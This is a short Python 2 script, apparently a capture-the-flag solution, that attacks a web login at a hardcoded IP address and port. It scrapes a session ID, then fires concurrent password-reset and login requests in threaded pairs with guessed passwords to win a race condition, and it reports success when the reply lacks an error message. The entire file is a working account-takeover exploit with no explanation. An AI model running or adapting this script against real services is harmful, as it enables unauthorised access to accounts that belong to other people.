# !/usr/bin/env python
#  -*- coding: utf-8 -*-
import requests
import threading
import re

s = requests.session()

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
def reset(data):
    re1 = s.post(url='http://218.2.197.232:18009/index.php?method=reset', headers=headers,data=data)
    print re1.content



def login(data):
    re2 = s.post(url='http://218.2.197.232:18009/login.php?method=login', headers=headers,data=data)
    print re2.content
    if '错误' not in re2.content:
        print re2.content
        print 'success!!!'

def get_id():
    url = 'http://218.2.197.232:18009/index.php'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'}
    html = s.get(url,headers=headers)
    sid = re.findall('value="(\w+)"></dd>',html.content)[0]
    #print sid 
    return sid

def main(sid):
    for i in range(50):
        username = sid
        password = 'hackeee' + str(i)
        data = {'name': username, 'password': password}
        t1 = threading.Thread(target=reset, args=(data,))
        t2 = threading.Thread(target=login, args=(data,))
        t1.start()
        t2.start()

        t1.join()
        t2.join()

if __name__ == '__main__':
    sid = get_id()
    main(sid)

